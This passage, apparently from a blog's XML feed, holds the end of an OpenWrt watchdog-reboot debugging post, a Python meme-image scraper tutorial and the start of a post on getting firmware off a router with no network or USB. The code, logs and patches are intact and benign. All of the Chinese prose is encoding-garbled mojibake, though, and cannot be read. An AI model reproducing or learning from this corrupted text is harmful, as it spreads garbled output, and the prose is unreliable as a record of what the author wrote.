<p>é™¤äº†ç¬¬ä¸€æ¬¡é‡ç°æ—¶éœ€è¦æ‰§è¡Œ<code>step1~4</code>å¤–ï¼Œä¹‹åé‡æ–°çƒ§å½•FWéƒ½åªéœ€æ‰§è¡Œç¬¬5æ­¥</p>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><h4 id="enable-lockup"><a href="#enable-lockup" class="headerlink" title="enable lockup"></a>enable lockup</h4><p>åœ¨æƒ…å†µå¹¶ä¸æ˜æœ—çš„æƒ…å†µä¸‹ï¼Œä»…ä»…æ ¹æ®ä»¥ä¸‹ä¸¤è¡Œlogæ ¹æœ¬æ— æ³•åˆ¤æ–­é—®é¢˜æ‰€åœ¨</p>
<pre><code class="log">Causing a watchdog bite!
Configuring Watchdog Timer
</code></pre>
<p>æ‰€ä»¥å…ˆå‡è®¾å¯èƒ½æ˜¯æŸäº›è¿›ç¨‹æ­»é”å¯¼è‡´çš„ï¼Œå¯ç”¨å†…æ ¸çš„<code>lockup debugging</code>åŠŸèƒ½ï¼Œå¯ç”¨æ–¹å¼ä¸ä¸Šè¿°ä¸€è‡´</p>
<p>å¯ç”¨åï¼Œé™¤äº†booté˜¶æ®µæ‰“å°äº†å¤§é‡logå¤–ï¼Œwatchdogé—®é¢˜å‡ºç°æ—¶å¹¶æ— ä»»ä½•lockup logå‡ºç°ï¼Œæ‰€ä»¥è¿›å…¥ä¸‹ä¸€æ­¥</p>
<h3 id="print-watchdog-ping-log"><a href="#print-watchdog-ping-log" class="headerlink" title="print watchdog ping log"></a>print watchdog ping log</h3><p>watchdogçš„å·¥ä½œæµç¨‹å¤§è‡´æ˜¯ï¼šprocdå®šæ—¶å‘é€ä¸€ä¸ªpingåŒ…ç»™å†…æ ¸ï¼Œå†…æ ¸çš„watchdogé©±åŠ¨æ¥æ”¶åˆ°pingåå–‚ç»™ç¡¬ä»¶watchdog</p>
<p>ä¸ºäº†ç¡®è®¤æ˜¯user spaceçš„é—®é¢˜è¿˜æ˜¯kernel spaceçš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦printä¸¤ä¸ªspaceçš„pingä¿¡æ¯ï¼Œç›¸å…³patchä¹Ÿå’Œä¸Šè¿°çš„ä¸€è‡´ï¼Œåªä¸è¿‡åœ¨procdä¸­éœ€è¦å¦å¤–æ·»åŠ ä¸€ä¸ªpatch</p>
<pre><code class="patch">+--- procd.old/watchdog.c    2020-01-13 16:03:08.671893208 +0800
++++ procd/watchdog.c    2020-01-13 16:06:32.966771640 +0800
+@@ -32,9 +33,26 @@
+ static int wdt_fd = -1;
+ static int wdt_frequency = 5;
+
++void __nprintf(const char *fmt, ...);
++/* use this &#39;__nprintf&#39; to print message */
++void __nprintf(const char *fmt, ...)
++{
++    va_list ap;
++    static FILE *filp;
++
++    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/console&quot;, &quot;a&quot;)) == NULL)
++            return;
++
++    va_start(ap, fmt);
++    vfprintf(filp, fmt, ap);
++    fputs(&quot;\n&quot;, filp);
++    va_end(ap);
++}
++
+ void watchdog_ping(void)
+ {
+     DEBUG(4, &quot;Ping\n&quot;);
++    __nprintf(&quot;[%s:%d] Ping\n&quot;, __func__, __LINE__);
+     if (wdt_fd &gt;= 0 &amp;&amp; write(wdt_fd, &quot;X&quot;, 1) &lt; 0)
+         ERROR(&quot;WDT failed to write: %s\n&quot;, strerror(errno));
+ }
</code></pre>
<p>å†æ¬¡é‡ç°å¯ä»¥çœ‹åˆ°ä»¥ä¸‹console log</p>
<pre><code class="log">124809:[Mon Jan 13 18:12:48.754 2020] [watchdog_ping:54] Ping
124810:[Mon Jan 13 18:12:48.754 2020] *************qcom-wdt-ping1*******************
124811:[Mon Jan 13 18:12:48.754 2020] **************qcom-wdt-ping2*******************
124814:[Mon Jan 13 18:12:52.811 2020] [watchdog_ping:54] Ping
124815:[Mon Jan 13 18:12:53.766 2020] *************qcom-wdt-ping1*******************
124816:[Mon Jan 13 18:12:53.766 2020] **************qcom-wdt-ping2*******************
124820:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/tmp/gl_task_name&#39;: No such file or directory
124821:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/var/log/block-site-messages&#39;: No such file or directory
124880:[Mon Jan 13 18:13:53.391 2020] Causing a watchdog bite!
</code></pre>
<p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨åˆ·æ–°block siteé¡µé¢åï¼Œconsoleä¸å†æ‰“å°watchdog logï¼Œå¯ä»¥åˆ¤æ–­æ˜¯user spaceå‡ºäº†é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯<code>procd</code>ã€‚</p>
<p>åœ¨åˆ·æ–°block siteé¡µé¢æ—¶ï¼Œå†…æ ¸æ¨¡å—ä¼šå‘é€ä¿¡å·å‘ŠçŸ¥<code>procd</code>ï¼ˆè¿™ä¸ªæ˜¯ç»„é•¿å‘ŠçŸ¥çš„ï¼Œé‡è¦ä¿¡æ¯ï¼ï¼‰ï¼Œç»“åˆlogä¸­æ˜¾ç¤ºçš„ä¸¤ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°ç›¸åº”çš„æ‰§è¡Œè„šæœ¬<code>send_email_alert</code>ã€‚procdåœ¨æ¥æ”¶ä¿¡å·åä¼šé€šè¿‡<code>system</code>å‡½æ•°è°ƒç”¨è„šæœ¬ï¼Œè¿›è€Œé€šè¿‡ssmtpå‘é€é‚®ä»¶ã€‚</p>
<p>æ­¤æ—¶ä¸ºäº†ç¡®å®šè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆå¼‚å¸¸ï¼Œæˆ‘åŠ äº†è®¸å¤šlogï¼Œç„¶åå®šä½åˆ°<code>ssmtp</code>æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œä¸ºæ­¤ï¼Œåˆ°äº†æ¥ä¸‹æ¥çš„æœ€åä¸€æ­¥ã€‚</p>
<h4 id="strace-ssmtp"><a href="#strace-ssmtp" class="headerlink" title="strace ssmtp"></a>strace ssmtp</h4><p>ä¿®æ”¹è„šæœ¬<code>send_email_alert</code>ï¼Œåœ¨æ‰§è¡Œssmtpå‰æ·»åŠ <code>strace</code>ï¼Œè¿½è¸ªä»£ç æ‰§è¡Œè¿‡ç¨‹ã€‚</p>
<pre><code class="log">[Tue Jan 14 16:08:44.046 2020] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
[Tue Jan 14 16:08:44.046 2020] connect(5, {sa_family=AF_INET, sin_port=htons(25), sin_addr=inet_addr(&quot;139.175.54.240&quot;)}, 16
</code></pre>
<p>å¯ä»¥å‘ç°è¿›ç¨‹å¡æ­»åœ¨connectéƒ¨åˆ†ï¼Œæœ€ç»ˆåˆ†æå‡ºè®¿é—®gmailæ—¶è¿æ¥è¶…æ—¶ï¼Œå¯¼è‡´procd hangä½ï¼Œæ— æ³•æ­£å¸¸å‘é€watchdog pingï¼Œè¿›è€Œå¼•å‘rebootã€‚</p>
<h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>åœ¨å¯ç”¨block siteåŠŸèƒ½å’Œsend_email_alertåŠŸèƒ½åï¼Œè®¿é—®ä¸€ä¸ªè¢«è·¯ç”±å™¨blockçš„ç½‘ç«™ï¼Œæ­¤æ—¶å†…æ ¸æ¨¡å—ä¼šå‘procdè¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œprocdæ¥æ”¶ä¿¡å·åä¼šåé€šè¿‡<code>system</code>å‡½æ•°æ‰§è¡Œä¸€ä¸ªå‘é€é‚®ä»¶çš„æŒ‡ä»¤ï¼Œä½†æ˜¯å½“å‘é€çš„å¯¹è±¡æ˜¯gmailæ—¶ï¼Œç”±äºä¸­å›½ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®googleï¼Œå¯¼è‡´é•¿æ—¶é—´æ— æ³•è¿æ¥ï¼Œæœ€ç»ˆå¯¼è‡´procd hangä½ï¼Œå¹¶ä¸”æ— æ³•å‘é€watchdog pingï¼Œæœ€ç»ˆå¯¼è‡´watchdogç­‰å¾…è¶…æ—¶è¿›è€Œé‡å¯è®¾å¤‡ã€‚</p>
<p>ç®€è¨€ä¹‹ï¼š<strong>é‚®ä»¶å‘é€è¶…æ—¶å¯¼è‡´procd hangä½</strong></p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>æœ€ç®€å•çš„æ–¹æ³•æ˜¯ï¼Œåœ¨è°ƒç”¨<code>system</code>å‡½æ•°æ—¶ï¼Œè®©æŒ‡ä»¤åœ¨åå°æ‰§è¡Œâ†“</p>
<pre><code class="patch">-   system(&quot;/etc/email/send_email_alert&quot;);
+   system(&quot;/etc/email/send_email_alert &amp;&quot;);
</code></pre>
<p>å½“ç„¶ï¼Œæˆ–è®¸æœ‰å…¶å®ƒæ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œæ¯”å¦‚ä¸è¦è®©å†…æ ¸æ¨¡å—ç›´æ¥å‘ä¿¡å·ç»™procdï¼Œæ¯•ç«Ÿprocdä½œä¸ºpidä¸º1çš„ç‰¹æ®Šè¿›ç¨‹ï¼Œä¸é€‚åˆå¤„ç†å¤ªå¤šçç¢çš„äº‹åŠ¡ã€‚å¯ä»¥è®©å†…æ ¸æ¨¡å—ç»™emailç›¸å…³çš„daemonè¿›ç¨‹å•ç‹¬å‘ä¿¡å·ï¼Œä½†æ”¹åŠ¨ä¼šå¤šå¾ˆå¤šã€‚å°±ç›®å‰è€Œè¨€ï¼Œä½¿ç”¨åå°æ‰§è¡ŒæŒ‡ä»¤çš„æ–¹æ³•æ˜¯ç®€å•è€Œæœ‰æ•ˆçš„ã€‚</p>
<p>OKï¼Œè¿™ä¸ªé—®é¢˜æ€»ç®—å®Œç»“äº†ï¼Œæ’’èŠ±âœ¿âœ¿ãƒ½(Â°â–½Â°)ãƒâœ¿~</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li>watchdogæ˜¯ç”¨æ¥ç›‘æ§ç³»ç»Ÿå¼‚å¸¸çš„ï¼Œå½“å…¶é‡å¯è®¾å¤‡æ—¶ï¼Œç»å¤§æƒ…å†µæºäºè¿›ç¨‹æ­»é”</li>
<li>å¯¹äºwatchdogç›¸å…³é—®é¢˜ï¼Œå¯ä»¥å…ˆç¡®è®¤æ˜¯ç”¨æˆ·ç©ºé—´çš„é—®é¢˜è¿˜æ˜¯å†…æ ¸ç©ºé—´çš„é—®é¢˜ï¼Œä¾¿äºé’ˆå¯¹æ€§debug</li>
<li>æœ‰æ—¶å€™ï¼ŒæŸäº›çœ‹èµ·æ¥ä¸é—®é¢˜æ¯«æ— å…³è”çš„logå¯èƒ½å°±æ˜¯æœ€å…³é”®çš„çªç ´ç‚¹</li>
<li>é‡ç°æ­¥éª¤çš„å‡†ç¡®æ€§èƒ½å¤§å¤§æé«˜é—®é¢˜è°ƒè¯•çš„æ•ˆç‡</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ftrace </tag>
            
            <tag> openwrt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«7 - çˆ¬å–è¡¨æƒ…åŒ…]]></title>
      <url>https://www.litreily.top/2019/10/09/fabiaoqing/</url>
      <content type="html"><![CDATA[<p>ä¸ºäº†é€—å¥³æœ‹å‹å¼€å¿ƒï¼Œæƒ³æ‰¾ä¸€å †è¡¨æƒ…åŒ…ï¼Œé‚£ä¹ˆä½œä¸ºä¸€åç¨‹åºå‘˜ï¼Œè‡ªç„¶æ˜¯ä¼šæƒ³åˆ°ç”¨ç¨‹åºæ¥å®Œæˆè¿™ä¸ªäº‹æƒ…ï¼Œè€ŒPythonçˆ¬è™«å°±æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„æ–¹æ³•ã€‚</p>
<p>æˆ‘å…ˆæ‰¾åˆ°äº†ä¸€ä¸ªä¸“é—¨å‘å¸ƒè¡¨æƒ…åŒ…çš„ç½‘ç«™ï¼Œå°±å«åš<a href="https://www.fabiaoqing.com/" target="_blank" rel="noopener">å‘è¡¨æƒ…</a>ç½‘ï¼Œå¯ä»¥é€šè¿‡æœç´¢å…³é”®è¯å¾—åˆ°å¤§é‡ç›¸å…³çš„è¡¨æƒ…åŒ…ï¼Œä¸‹é¢å¯¹è¿™ä¸ªç½‘ç«™çš„çˆ¬å–è¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚</p>
<p><img src="/assets/emotion/fabiaoqing.png" alt="fabiaoqing"></p>
<h2 id="åˆ†æç«™ç‚¹"><a href="#åˆ†æç«™ç‚¹" class="headerlink" title="åˆ†æç«™ç‚¹"></a>åˆ†æç«™ç‚¹</h2><p>ä¸ºäº†ä¸å¼•èµ·ä¸é€‚ï¼Œæˆ‘é€‰æ‹©æœç´¢â€œä½ å¥½â€ï¼Œå‡ºæ¥çš„ç»“æœæ˜¯è¿™æ ·çš„</p>
<p><img src="/assets/emotion/hello.png" alt="hello"></p>
<p>å¯ä»¥çœ‹åˆ°å…±æœ‰<code>688</code>ä¸ªç›¸å…³çš„<strong>è¡¨æƒ…</strong>ï¼Œå³ä¾§çš„<strong>è¡¨æƒ…åŒ…</strong>æ˜¯åˆ†ç»„å½¢å¼çš„ï¼Œä¸æ˜¯æˆ‘çš„çˆ¬å–å¯¹è±¡ã€‚æˆ‘ä»¬åªå…³æ³¨è¡¨æƒ…ï¼Œåœ¨ç½‘é¡µåº•éƒ¨å¯ä»¥çœ‹åˆ°åˆ†é¡µä¿¡æ¯ï¼š</p>
<p><img src="/assets/emotion/page.png" alt="page"></p>
<p>åˆ‡æ¢åˆ†é¡µåˆ°ç¬¬ï¼”é¡µåï¼Œå¯ä»¥çœ‹åˆ°ç½‘å€çš„ç¼–å·æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img src="/assets/emotion/hello-2.png" alt="hello page 2"></p>
<p>ç½‘å€æ˜¯<a href="https://www.fabiaoqing.com/search/search/keyword/ä½ å¥½/type/bq/page/4.html" target="_blank" rel="noopener">https://www.fabiaoqing.com/search/search/keyword/ä½ å¥½/type/bq/page/4.html</a>ï¼Œæ®æ­¤å°±å¯ä»¥åˆ†æå‡ºè¡¨æƒ…çš„åˆ†é¡µæ ¼å¼</p>
<ol>
<li><code>keyword</code> åæ¥å…³é”®è¯ï¼Œæ­¤å¤„ä¸ºâ€œä½ å¥½â€</li>
<li><code>type</code> åæ¥ç±»å‹ï¼Œæ­¤å¤„ä¸º&quot;bq&quot;,å¯¹åº”<strong>è¡¨æƒ…</strong></li>
<li><code>page</code> åæ¥é¡µç ï¼Œæ­¤å¤„ä¸º&quot;4.html&quot;ï¼Œå¯¹åº”ç¬¬ï¼”é¡µ</li>
</ol>
<p>åˆ°æ­¤å°±ç¡®å®šäº†å…³é”®è¯å’Œåˆ†é¡µä¿¡æ¯çš„æ•´åˆæ–¹å¼ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥æŒ‰é¡ºåºè·å–æŒ‡å®šå…³é”®è¯çš„æ‰€æœ‰åˆ†é¡µã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•è§£ææ¯ä¸ªåˆ†é¡µä¸­çš„å›¾ç‰‡ä¿¡æ¯ï¼Œä¸‹é¢è¯·çœ‹ï¼š</p>
<p><img src="/assets/emotion/hello-3.png" alt="hello page 3"></p>
<p>æ¯ä¸ªå›¾ç‰‡éƒ½åœ¨ä¸€ä¸ª<code>div</code>æ ‡ç­¾å†…ï¼Œä½¿ç”¨<code>chrome</code>çš„è°ƒè¯•å·¥å…·å¯ä»¥è·å–åˆ°å›¾ç‰‡å…ƒç´ çš„<code>xpath</code>è·¯å¾„ï¼Œç„¶åç¨ä½œä¿®æ”¹å°±å¯ä»¥åŒ¹é…åˆ°å½“å‰é¡µçš„æ‰€æœ‰å›¾ç‰‡</p>
<pre><code class="python">imgs = page.xpath(&#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)
</code></pre>
<p>å¥½äº†ï¼Œåˆ°æ­¤ï¼Œç½‘ç«™çš„åˆ†é¡µå·²ç»æ¯é¡µçš„å›¾ç‰‡è·å–æ–¹å¼éƒ½çŸ¥é“äº†ï¼Œä¸‹é¢å¼€å§‹å®Œæˆä»£ç çš„ç¼–å†™â†“</p>
<h2 id="çˆ¬è™«çš„ä»£ç å®ç°"><a href="#çˆ¬è™«çš„ä»£ç å®ç°" class="headerlink" title="çˆ¬è™«çš„ä»£ç å®ç°"></a>çˆ¬è™«çš„ä»£ç å®ç°</h2><ol>
<li>è·å–æŒ‡å®šå…³é”®è¯çš„æ‰€æœ‰åˆ†é¡µ</li>
<li>ä»åˆ†é¡µä¸­è·å–æ‰€æœ‰è¡¨æƒ…å›¾ç‰‡çš„é“¾æ¥</li>
<li>ä¸‹è½½å›¾ç‰‡å¹¶å­˜å‚¨åˆ°æœ¬åœ°</li>
</ol>
<h3 id="get-imgs"><a href="#get-imgs" class="headerlink" title="get_imgs"></a>get_imgs</h3><p>é¦–å…ˆå¯¹å•ä¸ªå…³é”®è¯ï¼Œå®ç°åˆ†é¡µå’Œå›¾ç‰‡é“¾æ¥çš„è·å–</p>
<pre><code class="python">def get_imgs(keyword):
    &#39;&#39;&#39;çˆ¬å–æŸä¸€ä¸ªå…³é”®è¯ç›¸å…³çš„æ‰€æœ‰è¡¨æƒ…åŒ…
    Args:
        keyword: è¡¨æƒ…åŒ…å…³é”®è¯
    &#39;&#39;&#39;
    page_index = 0
    img_cnts = 0
    save_dir = get_path(keyword)
    while True:
        page_index = page_index + 1
        # https://fabiaoqing.com/search/search/keyword/æŠ±æŠ±/type/bq/page/1.html
        url = &#39;{}{}/type/bq/page/{}.html&#39;.format(base_url, keyword, page_index)
        response = requests.get(url, headers=headers).content
        page = html.fromstring(response)
        imgs = page.xpath(
            &#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)

        print(&#39;çˆ¬å– &quot;{}&quot; ç›¸å…³è¡¨æƒ…åŒ…ç¬¬ {} é¡µ:&#39;.format(keyword, page_index))
        img_cnts = download_imgs(imgs, img_cnts, save_dir)

        if page_index == 1:
            page_num = int(
                page.xpath(&#39;//*[@id=&quot;mobilepage&quot;]/text()&#39;)[0].split()[-1])

        if page_index == page_num:
            break

    return img_cnts, save_dir
</code></pre>
<p>æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯ä»ï¼‘ä¸æ–­å¢åŠ åˆ†é¡µé¡µç <code>page_index</code>ï¼Œç„¶åä½¿ç”¨<code>lxml</code>ä¸­çš„<code>xpath</code>è§£æç½‘é¡µå¾—åˆ°å›¾ç‰‡é“¾æ¥ï¼Œæœ€åä½¿ç”¨ä¸‹é¢ä»‹ç»çš„<code>download_imgs</code>å‡½æ•°ä¸‹è½½å›¾ç‰‡ã€‚é‚£ä¹ˆä»€ä¹ˆæ—¶å€™åœæ­¢è·å–å‘¢ï¼Ÿå°±æ˜¯æ¯”è¾ƒé¦–é¡µè·å–çš„æ€»åˆ†é¡µæ•°<code>page_num</code>å’Œå½“å‰åˆ†é¡µæ•°<code>page_index</code>æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´è¯´æ˜å·²ç»åˆ°æœ€åä¸€é¡µã€‚</p>
<p>å‡½æ•°ä¸­çš„<code>get_path</code>æ˜¯ä¸ªè·å–æœ¬åœ°å­˜å‚¨é“¾æ¥çš„å‡½æ•°ï¼Œ<code>base_url</code>å’Œ<code>headers</code>æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡</p>
<pre><code class="python">base_url = &#39;https://fabiaoqing.com/search/search/keyword/&#39;
headers = {
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&#39;
}


def get_path(keyword):
    &#39;&#39;&#39;ç”ŸæˆæŒ‡å®šå…³é”®è¯å¯¹åº”çš„è¡¨æƒ…åŒ…å­˜å‚¨è·¯å¾„&#39;&#39;&#39;
    home_path = os.path.expanduser(&#39;~&#39;)
    path = os.path.join(home_path, &#39;Pictures/python/è¡¨æƒ…åŒ…/&#39; + keyword)
    if not os.path.isdir(path):
        os.makedirs(path)

    return os.path.realpath(path)
</code></pre>
<h3 id="download-imgs"><a href="#download-imgs" class="headerlink" title="download_imgs"></a>download_imgs</h3><pre><code class="python">def download_imgs(img_urls, starti, save_dir):
    &#39;&#39;&#39;ä¸‹è½½å•ä¸ªé¡µé¢å†…æ‰€æœ‰å›¾ç‰‡
    Args:
        img_urls: å…³é”®è¯ç›¸å…³è¡¨æƒ…åŒ…æŸä¸€åˆ†é¡µçš„æ‰€æœ‰å›¾ç‰‡é“¾æ¥
        starti: å½“å‰é¡µé¢é¦–ä¸ªå›¾ç‰‡å‘½åid
        save_dir: å›¾ç‰‡å­˜å‚¨è·¯å¾„
    &#39;&#39;&#39;
    fid = starti
    for img in img_urls:
        print(&#39;\t&#39; + img)
        fid = fid + 1
        file_name = &#39;{}.{}&#39;.format(fid, os.path.basename(img).split(&#39;.&#39;)[-1])
        save_path = os.path.join(save_dir, file_name)

        try:
            with open(save_path, &#39;wb&#39;) as f:
                f.write(requests.get(img, headers=headers, timeout=20).content)
        except requests.exceptions.ConnectionError as ce:
            print(ce.strerror())
        except requests.exceptions.MissingSchema:
            print(img + &#39; missing schema&#39;)
        except requests.exceptions.ReadTimeout:
            print(&#39;get {} timeout, skip this item.&#39;.format(img))
        finally:
            pass

    return fid
</code></pre>
<p>åˆ«çœ‹ä»£ç è¿™ä¹ˆé•¿ï¼Œä¸‹è½½å›¾ç‰‡çš„å…³é”®å°±ä¸¤è¡Œï¼Œå’Œä»¥å¾€ä¸‹è½½å›¾ç‰‡çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<pre><code class="python">with open(save_path, &#39;wb&#39;) as f:
    f.write(requests.get(img, headers=headers, timeout=20).content)
</code></pre>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>ä¸»å‡½æ•°ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä»å‘½ä»¤è¡Œå‚æ•°ä¸­è·å–æ‰€æœ‰å…³é”®è¯ï¼Œé€ä¸ªå¯¹å…³é”®è¯è¿›è¡Œå¯¹åº”çš„è¡¨æƒ…çˆ¬å–å¹¶ç»Ÿè®¡çˆ¬å–åˆ°çš„è¡¨æƒ…æ•°ã€‚</p>
<pre><code class="python">def main():
    if len(sys.argv) &lt; 2:
        usage()
        sys.exit(0)

    print(&#39;============================================&#39;)
    for keyword in sys.argv[1:]:
        print(&#39;å¼€å§‹çˆ¬å–å…³é”®è¯ä¸º &quot;{}&quot; çš„è¡¨æƒ…åŒ…:&#39;.format(keyword))
        count, save_dir = get_imgs(keyword)
        print(&#39;å…±çˆ¬å– &quot;{}&quot; è¡¨æƒ…åŒ… {} ä¸ª&#39;.format(keyword, count))
        print(&#39;æ–‡ä»¶å­˜å‚¨äº&quot;{}&quot;&#39;.format(save_dir))
    print(&#39;\nçˆ¬å–å®Œæˆï¼&#39;)
    print(&#39;============================================&#39;)
</code></pre>
<p>ç”±äºæˆ‘ä»¬çš„ç›®çš„æ˜¯æ ¹æ®è¾“å…¥çš„å…³é”®è¯å‚æ•°è·å–ç›¸å…³çš„è¡¨æƒ…ï¼Œä»£ç å®Œæˆåçš„ä½¿ç”¨æ–¹å¼æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="bash">python fabiaoqing_spider.py keyword1 keyword2 ...
</code></pre>
<p>æ‰€ä»¥<code>usage</code>å‡½æ•°æ˜¯è¿™æ ·çš„ï¼Œå¯ä»¥åŒæ—¶çˆ¬å–å¤šä¸ªå…³é”®è¯</p>
<pre><code class="python">def usage():
    print(&#39;Usage:\n\t&#39; + os.path.basename(sys.argv[0]) +
          &#39; [key1] [key2] [key3] ...\n&#39;)
</code></pre>
<h2 id="çˆ¬å–æµ‹è¯•"><a href="#çˆ¬å–æµ‹è¯•" class="headerlink" title="çˆ¬å–æµ‹è¯•"></a>çˆ¬å–æµ‹è¯•</h2><pre><code class="bash">python fabiaoqing_spider.py ä½ å¥½ æŠ±æŠ± äº²äº²
</code></pre>
<p><img src="/assets/emotion/test1.png" alt="test1"></p>
<p><img src="/assets/emotion/test2.png" alt="test2"></p>
<p><img src="/assets/emotion/test3.png" alt="test3"></p>
<p>ä¸Šé¢æ˜¯æˆªå–çš„éƒ¨åˆ†çˆ¬å–è¿‡ç¨‹ï¼Œä¸‹é¢æ˜¯<strong>äº²äº²</strong>è¡¨æƒ…åŒ…çš„çˆ¬å–ç»“æœ</p>
<p><img src="/assets/emotion/test4.png" alt="test4"></p>
<p>ä»£ç å·²æ‰˜ç®¡è‡³<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">ï¼§ithub capturer</a>é¡¹ç›®ï¼Œæ¬¢è¿äº¤æµã€‚</p>
<p>å¥½å•¦ï¼Œæœ€åç¥å¤§å®¶æ’©å¦¹æˆåŠŸï¼</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åµŒå…¥å¼è®¾å¤‡åœ¨æ— æ³•ä½¿ç”¨ç½‘ç»œå’ŒUSBçš„æƒ…å†µä¸‹å¦‚ä½•è¿›è¡Œæ–‡ä»¶ä¼ è¾“]]></title>
      <url>https://www.litreily.top/2019/09/12/minicom/</url>
      <content type="html"><![CDATA[<h2 id="é—®é¢˜èƒŒæ™¯"><a href="#é—®é¢˜èƒŒæ™¯" class="headerlink" title="é—®é¢˜èƒŒæ™¯"></a>é—®é¢˜èƒŒæ™¯</h2><p>ST æµ‹è¯•æ—¶å‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œè·¯ç”±å™¨ï¼ˆé‡‡ç”¨<a href="https://openwrt.org" target="_blank" rel="noopener">Openwrt</a>ç³»ç»Ÿï¼‰çš„consoleæ— æ³•æ­£å¸¸æ˜¾ç¤ºshellæç¤ºç¬¦ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯</p>
<pre><code class="bash">root@DeviceName:/#
</code></pre>
<p>è¿™æ ·çš„ï¼Œå‡ºé—®é¢˜æ—¶æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼Œç”¨æˆ·åä¸è§äº†ï¼Œè®¾å¤‡åå˜æˆäº†none.</p>
<pre><code class="bash">@(none):/#
</code></pre>
<a id="more"></a>
<p>ä¸ä»…å¦‚æ­¤ï¼Œæ‰§è¡Œlså‘ç°æ ¹ç›®å½•å¾ˆå¤šæ–‡ä»¶éƒ½ä¸å­˜åœ¨äº†ã€‚æœ€åˆæˆ‘å’Œç»„é•¿è®¤ä¸ºå¯èƒ½æ˜¯å­˜å‚¨å›ºä»¶çš„<code>nand flash</code>å‡ºäº†é—®é¢˜ï¼Œæ‰€ä»¥æƒ³æŠŠå›ºä»¶<code>dump</code>å‡ºæ¥æ¢åˆ°å¦ä¸€å—æ¿å­ä¸Šï¼Œæ‰€ä»¥å…ˆä½¿ç”¨<code>nanddump</code>æŒ‡ä»¤æŠŠå›ºä»¶ä¿å­˜åˆ°<code>fw.img</code>æ–‡ä»¶ä¸­ï¼š</p>
<pre><code class="bash">nanddump /dev/mtd8 -f /tmp/fw.img
</code></pre>
<p>æ¥ç€æƒ³è¦é€šè¿‡<code>tftp</code>ä¼ åˆ°å¤–é¢ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œ<code>ifconfig</code>æŸ¥çœ‹ç½‘ç»œä¿¡æ¯å‘ç°æ²¡æœ‰ä»»ä½•IPï¼Œ<code>ps</code>æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯å‘ç°ç»å¤§éƒ¨åˆ†è¿›ç¨‹éƒ½æ²¡æœ‰å¯åŠ¨ï¼Œå¾ˆæ˜¾ç„¶ï¼Œç¼ºå¤±çš„æ–‡ä»¶è¿‡å¤šï¼Œæ¿å­æ— æ³•æ­£å¸¸ä½¿ç”¨ç½‘ç»œä¼ è¾“äº†ã€‚é‚£ä¹ˆUSBå‘¢ï¼Œå¯¹äº†æˆ‘ç”¨çš„è¿™æ¬¾è·¯ç”±å™¨å¸¦æœ‰USBåŠŸèƒ½ï¼Œæ’ä¸Šä»¥åæ²¡æœ‰ä»»ä½•ååº”ï¼Œä¸è¿‡ä¹Ÿæ˜¯æ„æ–™ä¹‹ä¸­ï¼Œç›¸å…³çš„USBæ£€æµ‹è¿›ç¨‹æœ¨æœ‰èµ·æ¥å‘—ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨é—®é¢˜æ¥äº†ï¼Œåœ¨æ— æ³•ä½¿ç”¨ç½‘ç»œå’ŒUSBçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•æŠŠæ•°æ®ä»æ¿å­copyåˆ°PCå‘¢ï¼Ÿä¸‹é¢ä»‹ç»ä¸¤ç§æ–¹æ³•ã€‚</p>
